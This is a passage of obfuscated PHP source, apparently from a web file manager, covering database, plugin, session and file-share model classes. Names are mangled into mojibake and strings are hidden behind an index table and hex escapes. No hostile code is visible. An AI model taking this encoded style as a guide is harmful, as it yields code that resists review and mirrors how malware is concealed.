? $¾ÍÖ­ëŒ[938] : $¾ÍÖ­ëŒ[939]) . $¾ÍÖ­ëŒ[940] . $this->parseTable($‚êßê„[$¾ÍÖ­ëŒ[322]]) . $¾ÍÖ­ëŒ[934] . implode($¾ÍÖ­ëŒ[50], $ŒÛ†ĞşÓ) . $¾ÍÖ­ëŒ[941] . implode($¾ÍÖ­ëŒ[50], $›áË’Óö); return $this->execute($Éò°í°); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $‰ˆ»’õ” =& $_SERVER[”ôÑ§ì¸]; $this->error = mysql_errno() . $‰ˆ»’õ”[4] . mysql_error($this->_linkID); if ($‰ˆ»’õ”[12] != $this->queryStr) { $this->error .= LNG($‰ˆ»’õ”[48]) . $this->queryStr; } think_trace($this->error, $‰ˆ»’õ”[12], $‰ˆ»’õ”[49]); return $this->error; } public function escapeString($±‡ôí³¤) { if ($this->_linkID) { return mysql_real_escape_string($±‡ôí³¤, $this->_linkID); } else { return mysql_escape_string($±‡ôí³¤); } } public function parseKey(&$î„Ùó™ò, $ÉÂ¯–‡ = true) { $áÓ¡ò®ö =& $_SERVER[”ôÑ§ì¸]; if ($ÉÂ¯–‡) { $î„Ùó™ò = $this->parseKeyCheck($î„Ùó™ò); } if ($î„Ùó™ò != $áÓ¡ò®ö[202] && !preg_match($áÓ¡ò®ö[942], $î„Ùó™ò)) { $î„Ùó™ò = $áÓ¡ò®ö[428] . trim($î„Ùó™ò, $áÓ¡ò®ö[428]) . $áÓ¡ò®ö[428]; } return $î„Ùó™ò; } } goto eíÖÑ§Ø¤ç; bŠÏòÕáÈè: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\160\x6c\165\x67\x69\156\114\x69\163\164"; public $field = array("\156\x61\x6d\145", "\163\164\x61\164\165\163", "\162\x65\147\x69\x65\x73\x74", "\143\157\156\x66\151\147"); public function loadList($€Ê÷Â‘è = false) { $‚ŠµÖÕ = array_to_keyvalue($this->listData(), $_SERVER[”ôÑ§ì¸][32]); if ($€Ê÷Â‘è) { return $‚ŠµÖÕ[$€Ê÷Â‘è]; } return $‚ŠµÖÕ; } public function init() { $õ˜ÍˆõÎ =& $_SERVER[”ôÑ§ì¸]; Hook::trigger($õ˜ÍˆõÎ[1986]); $—ø’…Ç­ = $this->loadPluginList(); foreach ($—ø’…Ç­ as $£„Ãº‹‰ => $ÎĞµÏ¬Ô) { $åáæñÊï = $this->appAllow($£„Ãº‹‰, $ÎĞµÏ¬Ô); if (!$åáæñÊï) { continue; } foreach ($ÎĞµÏ¬Ô[$õ˜ÍˆõÎ[1987]] as $ Ãì‘È => $ä£ú¾) { Hook::bind($ Ãì‘È, $ä£ú¾); } } Hook::trigger($õ˜ÍˆõÎ[1988]); Hook::trigger(ACTION); } public function appAllow($ˆÇğ¨¹Ñ, $Í†í‡îÒ, $Šóƒ±¦Ó = true) { $’ÀØÀ¿ =& $_SERVER[”ôÑ§ì¸]; $·½ÂèÚŞ = PLUGIN_DIR . $ˆÇğ¨¹Ñ . $’ÀØÀ¿[1989]; if (!is_array($Í†í‡îÒ) || !is_array($Í†í‡îÒ[$’ÀØÀ¿[1987]]) || $Í†í‡îÒ[$’ÀØÀ¿[772]] != 1 || !is_file($·½ÂèÚŞ)) { return !1; } if ($GLOBALS[$’ÀØÀ¿[535]] == 1) { if ($GLOBALS[$’ÀØÀ¿[6]][$’ÀØÀ¿[1990]] || !$GLOBALS[$’ÀØÀ¿[6]][$’ÀØÀ¿[1991]]) { return !0; } $‹¥Šİ–‘ = explode($’ÀØÀ¿[50], strtolower($GLOBALS[$’ÀØÀ¿[6]][$’ÀØÀ¿[1991]])); return in_array(strtolower($ˆÇğ¨¹Ñ), $‹¥Šİ–‘) ? !1 : !0; } if ($Šóƒ±¦Ó && !Action($’ÀØÀ¿[1992])->checkAuth($ˆÇğ¨¹Ñ)) { return !1; } return !0; } public function unInstall($Ù«ÑÄãû) { $â®Œ–Íà =& $_SERVER[”ôÑ§ì¸]; $ÕßÑ€¿ = $this->loadList($Ù«ÑÄãû); if (file_exists(PLUGIN_DIR . $Ù«ÑÄãû)) { Hook::apply($Ù«ÑÄãû . $â®Œ–Íà[1993]); } $this->remove($ÕßÑ€¿[$â®Œ–Íà[442]]); } public function changeStatus($ş¤éó­Ú, $ûØë¾Ş) { $æ»ô–Ä„ =& $_SERVER[”ôÑ§ì¸]; $úÌíÌ‡¡ = $this->loadList($ş¤éó­Ú); if ($ûØë¾Ş) { Hook::apply($ş¤éó­Ú . $æ»ô–Ä„[1994]); } $this->update($úÌíÌ‡¡[$æ»ô–Ä„[442]], array($æ»ô–Ä„[1995] => $ûØë¾Ş)); } public function appRegist($Û°›ßÚÛ, $êÏ¾ØŠ±) { $‡¬Òˆô =& $_SERVER[”ôÑ§ì¸]; $ñşËı­â = $this->loadList($Û°›ßÚÛ); if ($ñşËı­â) { $this->update($ñşËı­â[$‡¬Òˆô[442]], array($‡¬Òˆô[1987] => $êÏ¾ØŠ±)); } else { $¾úù¶× = array($‡¬Òˆô[32] => $Û°›ßÚÛ, $‡¬Òˆô[1987] => $êÏ¾ØŠ±, $‡¬Òˆô[772] => 0, $‡¬Òˆô[6] => $this->getConfigDefault($Û°›ßÚÛ)); $this->insert($¾úù¶×); } } public function getConfigDefault($´£ÙŒô‘) { $ÎËœ©²ô =& $_SERVER[”ôÑ§ì¸]; $‚¥ªÊ± = array(); $òÓÓï¬ = $this->getPackageJson($´£ÙŒô‘); if (!$òÓÓï¬ && is_array($òÓÓï¬[$ÎËœ©²ô[1996]])) { return $‚¥ªÊ±; } foreach ($òÓÓï¬[$ÎËœ©²ô[1996]] as $õ¤°· ¬ => $à¤“¦¼) { if (!isset($à¤“¦¼[$ÎËœ©²ô[417]]) || isset($‚¥ªÊ±[$õ¤°· ¬])) { continue; } $‚¥ªÊ±[$õ¤°· ¬] = $à¤“¦¼[$ÎËœ©²ô[417]]; } return $‚¥ªÊ±; } public function getPackageJson($øƒê’âî) { return Hook::apply($øƒê’âî . $_SERVER[”ôÑ§ì¸][1997]); } public function getConfig($•ÆÖ ˆÜ, $æ¾ÕÆŠ = false) { $ï¬ÅôÂç =& $_SERVER[”ôÑ§ì¸]; $´ñä„Î¯ = array(); $…ô»Ø¯Ÿ = $this->loadList($•ÆÖ ˆÜ); if ($…ô»Ø¯Ÿ && is_array($…ô»Ø¯Ÿ[$ï¬ÅôÂç[6]])) { $´ñä„Î¯ = $…ô»Ø¯Ÿ[$ï¬ÅôÂç[6]]; } if (!$´ñä„Î¯ || $æ¾ÕÆŠ) { $´ñä„Î¯ = $this->getConfigDefault($•ÆÖ ˆÜ); } return $´ñä„Î¯; } public function setConfig($‡§ºíˆÃ, $Éºäˆë¼ = false) { $Ş¤’ƒ‹° =& $_SERVER[”ôÑ§ì¸]; $ı‚‡ë Õ = $this->loadList($‡§ºíˆÃ); if (!$ı‚‡ë Õ) { return !1; } $ªŸÂÂè = $ı‚‡ë Õ[$Ş¤’ƒ‹°[6]]; if ($Éºäˆë¼ == !1) { $ªŸÂÂè = array(); $Éºäˆë¼ = $this->getConfigDefault($‡§ºíˆÃ); } foreach ($Éºäˆë¼ as $şÂ˜ÅˆÎ => $ª“†”Ñ¿) { $ªŸÂÂè[$şÂ˜ÅˆÎ] = is_string($ª“†”Ñ¿) ? trim($ª“†”Ñ¿) : $ª“†”Ñ¿; } $this->update($ı‚‡ë Õ[$Ş¤’ƒ‹°[442]], array($Ş¤’ƒ‹°[6] => $ªŸÂÂè)); } public function viewList() { $–¯Ó·ã© =& $_SERVER[”ôÑ§ì¸]; $–şˆ¸· = $this->loadList(); $this->pluginScan($–şˆ¸·); $–şˆ¸· = $this->loadPluginList(); $Üı˜§ö’ = array(); foreach ($–şˆ¸· as $áÊ×Ø£æ => $Ùğ½çåî) { unset($Ùğ½çåî[$–¯Ó·ã©[1987]], $Ùğ½çåî[$–¯Ó·ã©[6]]); $‡‘– —˜ = PLUGIN_DIR . $Ùğ½çåî[$–¯Ó·ã©[32]] . $–¯Ó·ã©[1989]; if (!is_file($‡‘– —˜)) { continue; } $±úõÎ¤‹ = Hook::apply($Ùğ½çåî[$–¯Ó·ã©[32]] . $–¯Ó·ã©[1997]); if (is_array($±úõÎ¤‹)) { $Üı˜§ö’[$áÊ×Ø£æ] = array_merge($Ùğ½çåî, $±úõÎ¤‹); } } return $Üı˜§ö’; } private function loadPluginList() { $¿ÉŒ§…­ =& $_SERVER[”ôÑ§ì¸]; $Úºã’Œ = $this->loadList(); if (strtolower(MOD) == $¿ÉŒ§…­[1998]) { return $Úºã’Œ; } $¡›¿¨ï® = Hook::trigger($¿ÉŒ§…­[1999], $Úºã’Œ); if ($Úºã’Œ && !$¡›¿¨ï®) { die; } return $¡›¿¨ï® ? $¡›¿¨ï® : $Úºã’Œ; } private function pluginScan($ä‡…äµÓ) { $“•òŞş£ =& $_SERVER[”ôÑ§ì¸]; recursion_dir(PLUGIN_DIR, $¼şœ»šñ, $ñ¶²¡—, 0); foreach ($¼şœ»šñ as $…±¾›ã¬) { $«—¥œã = get_path_this($…±¾›ã¬); if (isset($ä‡…äµÓ[$«—¥œã]) || !file_exists($…±¾›ã¬ . $“•òŞş£[2000]) || !file_exists($…±¾›ã¬ . $“•òŞş£[1989])) { continue; } Hook::apply($«—¥œã . $“•òŞş£[1994]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\155\x5f\163\x65\x73\x73\x69\x6f\x6e"; public function get($Ò³›ñé­) { $öà½‰­ =& $_SERVER[”ôÑ§ì¸]; $·¨µ¡¿Ë = $this->where(array($öà½‰­[2001] => $Ò³›ñé­))->find(); if (!is_array($·¨µ¡¿Ë)) { return !1; } return $·¨µ¡¿Ë[$öà½‰­[776]]; } public function set($—‹¬Ç±›, $ù°–Ûúí, $­î ÛË£ = 3600) { $çê»“ñã =& $_SERVER[”ôÑ§ì¸]; $¦¦€ñÙş = array($çê»“ñã[2001] => $—‹¬Ç±›, $çê»“ñã[1905] => $ù°–Ûúí, $çê»“ñã[2002] => $­î ÛË£ + time()); if (Session::get($çê»“ñã[2003])) { $¦¦€ñÙş[$çê»“ñã[1674]] = Session::get($çê»“ñã[2003]); } else { $¦¦€ñÙş[$çê»“ñã[1674]] = 0; } if ($this->get($—‹¬Ç±›)) { return $this->where(array($çê»“ñã[2001] => $—‹¬Ç±›))->save($¦¦€ñÙş); } else { return $this->add($¦¦€ñÙş, array(), !0); } } public function remove($ÍÛ¬üğº) { return $this->where(array($_SERVER[”ôÑ§ì¸][2001] => $ÍÛ¬üğº))->delete(); } public function clearTimeout() { return $this->where($_SERVER[”ôÑ§ì¸][2004] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\145"; protected $dataAuto = array(array("\x6d\157\x64\151\x66\x79\x54\x69\155\x65", "\x74\151\155\145", "\151\x6e\163\x65\162\x74\54\165\160\144\141\164\x65", "\146\165\156\x63\164\151\x6f\156"), array("\143\162\x65\x61\164\x65\x54\151\x6d\145", "\x74\151\x6d\145", "\x69\156\163\x65\x72\164", "\146\165\x6e\143\x74\151\x6f\x6e"), array("\157\x70\164\x69\x6f\156\x73", '', "\151\156\163\145\x72\x74\x2c\165\160\x64\141\x74\x65\x2c\x73\145\x6c\145\x63\x74", "\152\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ßâşü³ş) { $ŸÈØü =& $_SERVER[”ôÑ§ì¸]; $£´ìº¾ª = isset($ßâşü³ş[0]) ? $ßâşü³ş[0] : !1; return array($ŸÈØü[2005] => array(USER_ID, $ŸÈØü[2006]), $ŸÈØü[1946] => array($£´ìº¾ª, $ŸÈØü[2007])); } protected function listSimple() { $½áÙ˜Ëß = array($_SERVER[”ôÑ§ì¸][1674] => USER_ID); $Øåàé‘ë = $this->field($this->fieldList)->where($½áÙ˜Ëß)->select(); return $Øåàé‘ë ? $Øåàé‘ë : array(); } protected function getInfo($«ùÛıò©, $ÀÁ®¿¾« = false) { $áƒ¥ğñ =& $_SERVER[”ôÑ§ì¸]; if ($ÀÁ®¿¾«) { return $this->_getShareInfo(array($áƒ¥ğñ[632] => $«ùÛıò©)); } $¸ƒÑ½š™ = $this->cacheFunctionGet($áƒ¥ğñ[1948], $«ùÛıò©); return $¸ƒÑ½š™; } public function getInfoByHash($·¿ˆó¼ì) { return $this->_getShareInfo(array($_SERVER[”ôÑ§ì¸][2008] => $·¿ˆó¼ì)); } public function getInfoByPath($ò»æğß¦) { $ÅÑ‰ö—… =& $_SERVER[”ôÑ§ì¸]; $ªãß·•“ = array($ÅÑ‰ö—…[1674] => USER_ID, $ÅÑ‰ö—…[180] => $ò»æğß¦); return $this->_getShareInfo($ªãß·•“); } public function getInfoBySourcePath($Š¾ÚÛÀ›) { $ £×Æš¶ =& $_SERVER[”ôÑ§ì¸]; $“ı‡Çı = array($ £×Æš¶[1674] => USER_ID, $ £×Æš¶[1206] => $Š¾ÚÛÀ›); return $this->_getShareInfo($“ı‡Çı); } private function _getShareInfo($à¿Ñ…Û±) { $´èûÃ´å =& $_SERVER[”ôÑ§ì¸]; $Õæ‡ÛÊ¢ = $this->where($à¿Ñ…Û±)->find(); if (!$Õæ‡ÛÊ¢) { return !1; } $à¿Ñ…Û± = array($´èûÃ´å[632] => $Õæ‡ÛÊ¢[$´èûÃ´å[632]]); $…ñ„»şØ = $´èûÃ´å[2009]; $¨æ«šØ² = Model($´èûÃ´å[633])->order($´èûÃ´å[442])->field($…ñ„»şØ)->where($à¿Ñ…Û±)->select(); if ($Õæ‡ÛÊ¢[$´èûÃ´å[180]] == $´èûÃ´å[211]) { $Õæ‡ÛÊ¢[$´èûÃ´å[87]] = IO::info($Õæ‡ÛÊ¢[$´èûÃ´å[1206]]); } else { $Õæ‡ÛÊ¢[$´èûÃ´å[87]] = Model($´èûÃ´å[1363])->pathInfo($Õæ‡ÛÊ¢[$´èûÃ´å[180]]); } $Õæ‡ÛÊ¢[$´èûÃ´å[2010]] = $¨æ«šØ²; return $Õæ‡ÛÊ¢; } protected function getInfoAuth($¼ÁË´Ù) { $¼ëé®× =& $_SERVER[”ôÑ§ì¸]; $£äş™ç³ = $this->getInfo($¼ÁË´Ù); if ($£äş™ç³[$¼ëé®×[1674]] == USER_ID) { $£äş™ç³[$¼ëé®×[454]] = $£äş™ç³[$¼ëé®×[87]][$¼ëé®×[454]]; } else { $£äş™ç³[$¼ëé®×[454]] = Model($¼ëé®×[534])->authMake($£äş™ç³[$¼ëé®×[2010]]); } return $£äş™ç³; } protected function listData($‚Åö“Ü½ = null, $²ƒ·¬²ê = 300) { $‚µ•­†© =& $_SERVER[”ôÑ§ì¸]; $Ùë”¹× = array(array($‚µ•­†©[529] => array($‚µ•­†©[1043], 0), $‚µ•­†©[630] => array($‚µ•­†©[1043], 0), $‚µ•­†©[2011] => $‚µ•­†©[1964])); if ($‚Åö“Ü½ == $‚µ•­†©[2012]) { $Ùë”¹× = array($‚µ•­†©[529] => 1); } else { if ($‚Åö“Ü½ == $‚µ•­†©[1192]) { $Ùë”¹× = array($‚µ•­†©[630] => 1); } } $Ùë”¹×[$‚µ•­†©[1674]] = USER_ID; $“Œ¦ˆçš = $this->where($Ùë”¹×)->selectPage($²ƒ·¬²ê); return $“Œ¦ˆçš; } protected function listToMe($¬©‡•¾­ = 300) { $…àº˜º =& $_SERVER[”ôÑ§ì¸]; $úéğ™± = Model($…àº˜º[2013])->userGroupParents(USER_ID); $²¾ûü“ = array($…àº˜º[615] => SourceModel::TYPE_USER, $…àº˜º[537] => USER_ID); if ($úéğ™±) { $²¾ûü“ = array(array($…àº˜º[615] => SourceModel::TYPE_USER, $…àº˜º[537] => USER_ID), array($…àº˜º[615] => SourceModel::TYPE_GROUP, $…àº˜º[537] => array($…àº˜º[7], $úéğ™±)), $…àº˜º[2011] => $…àº˜º[1964]); } $Š½¨Úåª = Model($…àº˜º[633])->where($²¾ûü“)->selectPage($¬©‡•¾­); $·Í¤­¤ = array_to_keyvalue_group($Š½¨Úåª[$…àº˜º[412]], $…àº˜º[632]); if (!$·Í¤­¤) { return $Š½¨Úåª; } $¥ûò¦õ = $…àº˜º[2014]; $²¾ûü“ = array($…àº˜º[632] => array($…àº˜º[459], array_keys($·Í¤­¤)), $…àº˜º[1674] => array($…àº˜º[1045], $…àº˜º[211])); $…üš˜Ìş = $this->field($¥ûò¦õ)->where($²¾ûü“)->select(); foreach ($…üš˜Ìş as $‘êŒ‹¿ => &$à¦œúÒÖ) { $à¦œúÒÖ[$…àº˜º[2010]] = $·Í¤­¤[$à¦œúÒÖ[$…àº˜º[632]]]; } unset($à¦œúÒÖ); $×‡üúŒ´ = array($…àº˜º[2015] => $…üš˜Ìş, $…àº˜º[2016] => $Š½¨Úåª[$…àº˜º[409]]); return $×‡üúŒ´; } protected function shareAdd($éßˆöôõ, $¬Ş»ÎÚ–) { $¤ñºÑ˜ =& $_SERVER[”ôÑ§ì¸]; $£İ¥µë = $this->_addShareData($éßˆöôõ, $¬Ş»ÎÚ–); if (!empty($¬Ş»ÎÚ–[$¤ñºÑ˜[2017]])) { $this->_shareAuthSet($£İ¥µë, $¬Ş»ÎÚ–[$¤ñºÑ˜[2017]]); } $this->shareEventAdd($éßˆöôõ, $¬Ş»ÎÚ–, $¤ñºÑ˜[2018]); return $£İ¥µë; } protected function shareAddSystem($¥£‘÷Ø£, $æƒó’¥â) { $ä°„©´€ =& $_SERVER[”ôÑ§ì¸]; $ùº®ØÆ = $this->_addShareData($¥£‘÷Ø£, $æƒó’¥â, $ä°„©´€[178]); $this->_shareAuthSet($ùº®ØÆ, $æƒó’¥â[$ä°„©´€[2017]]); return $ùº®ØÆ; } private function shareEventAdd($è›ÀÅß, $¶Í•¢Œø, $ÄõÑ±ğ = "\x61\x64\144") { $Ê¡õŞú’ =& $_SERVER[”ôÑ§ì¸]; if (!$è›ÀÅß || $è›ÀÅß == $Ê¡õŞú’[211]) { return; } if ($ÄõÑ±ğ == $Ê¡õŞú’[2018]) { if ($¶Í•¢Œø[$Ê¡õŞú’[529]] == $Ê¡õŞú’[88]) { Model($Ê¡õŞú’[600])->eventShare($è›ÀÅß, $Ê¡õŞú’[2019]); } if ($¶Í•¢Œø[$Ê¡õŞú’[630]] == $Ê¡õŞú’[88]) { Model($Ê¡õŞú’[600])->eventShare($è›ÀÅß, $Ê¡õŞú’[2020]); } return; } $Œ©ï–ë— = $this->getInfoByPath($è›ÀÅß); $‡±“ÆŸ‚ = $Ê¡õŞú’[2021]; if ($Œ©ï–ë—[$Ê¡õŞú’[529]] == $Ê¡õŞú’[211] && $¶Í•¢Œø[$Ê¡õŞú’[529]] == $Ê¡õŞú’[88]) { $‡±“ÆŸ‚ = $Ê¡õŞú’[2019]; } if ($Œ©ï–ë—[$Ê¡õŞú’[529]] == $Ê¡õŞú’[88] && $¶Í•¢Œø[$Ê¡õŞú’[529]] == $Ê¡õŞú’[211]) { $‡±“ÆŸ‚ = $Ê¡õŞú’[2022]; } if ($Œ©ï–ë—[$Ê¡õŞú’[630]] == $Ê¡õŞú’[211] && $¶Í•¢Œø[$Ê¡õŞú’[630]] == $Ê¡õŞú’[88]) { $‡±“ÆŸ‚ = $Ê¡õŞú’[2020]; } if ($Œ©ï–ë—[$Ê¡õŞú’[630]] == $Ê¡õŞú’[88] && $¶Í•¢Œø[$Ê¡õŞú’[630]] == $Ê¡õŞú’[211]) { $‡±“ÆŸ‚ = $Ê¡õŞú’[2023]; } Model($Ê¡õŞú’[600])->eventShare($è›ÀÅß, $‡±“ÆŸ‚); return; } private function _addShareData($ñÎûÈ‡Ø, $Ï¸”Á‰© = array(), $´”…¡á = false) { $¿€ë•åÒ =& $_SERVER[”ôÑ§ì¸]; $Å´­İ© = $´”…¡á == $¿€ë•åÒ[178] ? 0 : USER_ID; $Ì†šÃ¬Å = array($¿€ë•åÒ[458] => $ñÎûÈ‡Ø, $¿€ë•åÒ[1665] => $Å´­İ©); if ($ñÎûÈ‡Ø == 0) { $Ì†šÃ¬Å = array($¿€ë•åÒ[2024] => $Ï¸”Á‰©[$¿€ë•åÒ[1206]], $¿€ë•åÒ[1665] => $Å´­İ©); } if ($ßƒ½’Ò” = $this->where($Ì†šÃ¬Å)->find()) { return $ßƒ½’Ò”[$¿€ë•åÒ[632]]; } if ($ñÎûÈ‡Ø == 0) { $‘·ª¥âò = array($¿€ë•åÒ[32] => get_path_this($Ï¸”Á‰©[$¿€ë•åÒ[84]])); } else { $‘·ª¥âò = Model($¿€ë•åÒ[847])->sourceInfo($ñÎûÈ‡Ø); if (!$‘·ª¥âò) { return !1; } } if (!$Ï¸”Á‰©[$¿€ë•åÒ[1571]]) { $Ï¸”Á‰©[$¿€ë•åÒ[1571]] = $‘·ª¥âò[$¿€ë•åÒ[32]]; } $İ‘ôÇŒÏ = array($¿€ë•åÒ[1665] => $Å´­İ©, $¿€ë•åÒ[458] => $ñÎûÈ‡Ø, $¿€ë•åÒ[1571] => $¿€ë•åÒ[12], $¿€ë•åÒ[529] => 0, $¿€ë•åÒ[630] => 0, $¿€ë•åÒ[1206] => $¿€ë•åÒ[12], $¿€ë•åÒ[350] => $¿€ë•åÒ[12], $¿€ë•åÒ[920] => $¿€ë•åÒ[12], $¿€ë•åÒ[2025] => 0, $¿€ë•åÒ[2026] => 0, $¿€ë•åÒ[783] => 0, $¿€ë•åÒ[2027] => $¿€ë•åÒ[12], $¿€ë•åÒ[2008] => $¿€ë•åÒ[12]); $Úß¶¦Ü» = explode($¿€ë•åÒ[50], $¿€ë•åÒ[2028]); foreach ($Úß¶¦Ü» as $«ÅÈªŒ¯) { if (!isset($Ï¸”Á‰©[$«ÅÈªŒ¯])) { continue; } $İ‘ôÇŒÏ[$«ÅÈªŒ¯] = $Ï¸”Á‰©[$«ÅÈªŒ¯]; } $ıŠŠÃ–ú = $this->add($İ‘ôÇŒÏ); $İÛŠÈ´í = array($¿€ë•åÒ[2008] => short_id($ıŠŠÃ–ú)); $this->where(array($¿€ë•åÒ[2029] => $ıŠŠÃ–ú))->save($İÛŠÈ´í); return $ıŠŠÃ–ú; } private function _shareAuthSet($œšíä, $÷…±ìëù) { $Ê¢¡üØ¬ =& $_SERVER[”ôÑ§ì¸]; if (!is_array($÷…±ìëù)) { return !1; } $•¨‡š¥Ö = Model($Ê¢¡üØ¬[1974]); $•¨‡š¥Ö->where(array($Ê¢¡üØ¬[632] => $œšíä))->delete(); $§şÚé—Ô = array(); foreach ($÷…±ìëù as $€¤´ÖÚ) { $†ôâèğ² = SourceModel::TYPE_USER; if ($€¤´ÖÚ[$Ê¢¡üØ¬[177]] == SourceModel::TYPE_GROUP) { $†ôâèğ² = SourceModel::TYPE_GROUP; } $ñ¤šÆßç = array($Ê¢¡üØ¬[632] => $œšíä, $Ê¢¡üØ¬[177] => $†ôâèğ², $Ê¢¡üØ¬[537] => intval($€¤´ÖÚ[$Ê¢¡üØ¬[537]]), $Ê¢¡üØ¬[1970] => 0, $Ê¢¡üØ¬[2030] => -1); if ($€¤´ÖÚ[$Ê¢¡üØ¬[1970]]) { $ñ¤šÆßç[$Ê¢¡üØ¬[1970]] = $€¤´ÖÚ[$Ê¢¡üØ¬[1970]]; } else { if ($€¤´ÖÚ[$Ê¢¡üØ¬[2030]]) { $ñ¤šÆßç[$Ê¢¡üØ¬[2030]] = $€¤´ÖÚ[$Ê¢¡üØ¬[2030]]; } } $§şÚé—Ô[] = $ñ¤šÆßç; } return $•¨‡š¥Ö->addAll($§şÚé—Ô, array(), !0); } public function numViewAdd($Ë©ó ÂÌ) { $Ÿğ‘ÌúŞ =& $_SERVER[”ôÑ§ì¸]; $¥šò£İ = array($Ÿğ‘ÌúŞ[2029] => $Ë©ó ÂÌ); $this->where($¥šò£İ)->setAdd($Ÿğ‘ÌúŞ[2025]); } public function numDownloadAdd($æşñ²ç¡) { $ğ•••Åã =& $_SERVER[”ôÑ§ì¸]; $•ÏœˆÜ = array($ğ•••Åã[2029] => $æşñ²ç¡); $this->where($•ÏœˆÜ)->setAdd($ğ•••Åã[2026]); } protected function shareEdit($óê¢“™Ï, $“­µÂá) { $”ášâî  =& $_SERVER[”ôÑ§ì¸]; $¶–ááÕˆ = $this->getInfo($óê¢“™Ï); if (!$¶–ááÕˆ) { return !1; } $this->_checkLinkShare($“­µÂá, $¶–ááÕˆ); $Š¸½™¿Ä = array(); $ò§«ÂÃ™ = explode($”ášâî [50], $”ášâî [2031]); foreach ($ò§«ÂÃ™ as $Óñ®äª) { if (!array_key_exists($Óñ®äª, $“­µÂá)) { continue; } $Š¸½™¿Ä[$Óñ®äª] = $“­µÂá[$Óñ®äª]; } $this->shareEventAdd($¶–ááÕˆ[$”ášâî [180]], $“­µÂá, $”ášâî [1836]); $this->where(array($”ášâî [2029] => $óê¢“™Ï))->save($Š¸½™¿Ä); if (isset($“­µÂá[$”ášâî [2017]])) { $this->_shareAuthSet($óê¢“™Ï, $“­µÂá[$”ášâî [2017]]); } return !0; } private function _checkLinkShare($ÁÄ‰ÈÔ, $İÀ‰À™Ü) { $§Ì¢à„ =& $_SERVER[”ôÑ§ì¸]; if ($ÁÄ‰ÈÔ[$§Ì¢à„[529]] != $§Ì¢à„[88]) { return; } $½ÔäÁ£Í = $İÀ‰À™Ü[$§Ì¢à„[87]][$§Ì¢à„[180]]; if ($İÀ‰À™Ü[$§Ì¢à„[87]][$§Ì¢à„[33]] != $§Ì¢à„[213]) { $ª×…¨Áğ = $this->_folderReport($½ÔäÁ£Í); if (!$ª×…¨Áğ) { return; } show_json(LNG($§Ì¢à„[2032]) . $§Ì¢à„[2033] . $ª×…¨Áğ, !1); } $Øç°İ”à = Model($§Ì¢à„[847])->fileInfoGet($İÀ‰À™Ü[$§Ì¢à„[87]][$§Ì¢à„[180]]); if (!$Øç°İ”à) { return; } $‘è‹Ìß = $this->shareFileMeta($Øç°İ”à[$§Ì¢à„[508]]); if (isset($‘è‹Ìß[$§Ì¢à„[417]]) && $‘è‹Ìß[$§Ì¢à„[417]] == $§Ì¢à„[88]) { show_json(LNG($§Ì¢à„[2034]), !1); } } private function _folderReport($ÖúöÇªŸ) { $Œ–ä½àØ =& $_SERVER[”ôÑ§ì¸]; $†¿°¤˜© = array($Œ–ä½àØ[508] => array($Œ–ä½àØ[1043], 0), $Œ–ä½àØ[772] => 3); $ü‰õ ®¨ = Model($Œ–ä½àØ[2035])->where($†¿°¤˜©)->field($Œ–ä½àØ[508])->select(); if (!$ü‰õ ®¨) { return !1; } $ü‰õ ®¨ = array_to_keyvalue($ü‰õ ®¨, $Œ–ä½àØ[12], $Œ–ä½àØ[508]); $ëĞªİª¨ = $Œ–ä½àØ[50] . $ÖúöÇªŸ . $Œ–ä½àØ[50]; $†¿°¤˜© = array($Œ–ä½àØ[508] => array($Œ–ä½àØ[7], $ü‰õ ®¨), $Œ–ä½àØ[552] => array($Œ–ä½àØ[426], "\x25{$ëĞªİª¨}\x25"), $Œ–ä½àØ[472] => 0); $ì¨Ø™È‰ = Model($Œ–ä½àØ[847])->where($†¿°¤˜©)->field($Œ–ä½àØ[2036])->find(); if (!$ì¨Ø™È‰) { return !1; } $ØÛ®ÙÖ = substr($ì¨Ø™È‰[$Œ–ä½àØ[552]], strpos($ì¨Ø™È‰[$Œ–ä½àØ[552]], $ëĞªİª¨)); $†¿°¤˜© = array($Œ–ä½àØ[180] => array($Œ–ä½àØ[7], trim($ØÛ®ÙÖ, $Œ–ä½àØ[50]))); $Î‡ñ¹ = Model($Œ–ä½àØ[847])->where($†¿°¤˜©)->field($Œ–ä½àØ[32])->select(); $õ‚¢ÈÓÕ = array_to_keyvalue($Î‡ñ¹, $Œ–ä½àØ[12], $Œ–ä½àØ[32]); $õ‚¢ÈÓÕ[] = $ì¨Ø™È‰[$Œ–ä½àØ[32]]; return implode($Œ–ä½àØ[8], $õ‚¢ÈÓÕ); } protected function remove($§Íìˆ¾Ò) { $µıÅÁÇ =& $_SERVER[”ôÑ§ì¸]; if (is_array($§Íìˆ¾Ò)) { $§Íìˆ¾Ò = array($µıÅÁÇ[7], $§Íìˆ¾Ò); } $œò ©š = array($µıÅÁÇ[632] => $§Íìˆ¾Ò); $Ëİ†½Ó = $this->where($œò ©š)->delete(); if ($Ëİ†½Ó) { Model($µıÅÁÇ[633])->where(array($µıÅÁÇ[632] => $§Íìˆ¾Ò))->delete(); } $»Éñ€¯ = is_array($§Íìˆ¾Ò) ? $§Íìˆ¾Ò[1] : array($§Íìˆ¾Ò); for ($¤ìãô× = 0; $¤ìãô× < count($»Éñ€¯); $¤ìãô×++) { $Ø âÓ¤È = $this->getInfo($»Éñ€¯[$¤ìãô×]); if ($Ø âÓ¤È[$µıÅÁÇ[630]] == $µıÅÁÇ[88]) { Model($µıÅÁÇ[600])->eventShare($Ø âÓ¤È[$µıÅÁÇ[180]], $µıÅÁÇ[2023]); } if ($Ø âÓ¤È[$µıÅÁÇ[529]] == $µıÅÁÇ[88]) { Model($µıÅÁÇ[600])->eventShare($Ø âÓ¤È[$µıÅÁÇ[180]], $µıÅÁÇ[2022]); } } return $Ëİ†½Ó; } protected function removeBySource($ü şèí) { $ş¾İ·­ï =& $_SERVER[”ôÑ§ì¸]; $ğÊÅÅ¹• = array($ş¾İ·­ï[458] => array($ş¾İ·­ï[459], $ü şèí)); $¯…ãİí” = $this->field($ş¾İ·­ï[632])->where($ğÊÅÅ¹•)->select(); $¯…ãİí” = array_to_keyvalue($¯…ãİí”, $ş¾İ·­ï[12], $ş¾İ·­ï[632]); if (!$¯…ãİí”) { return; } $ğÊÅÅ¹• = array($ş¾İ·­ï[2029] => array($ş¾İ·­ï[459], $¯…ãİí”)); 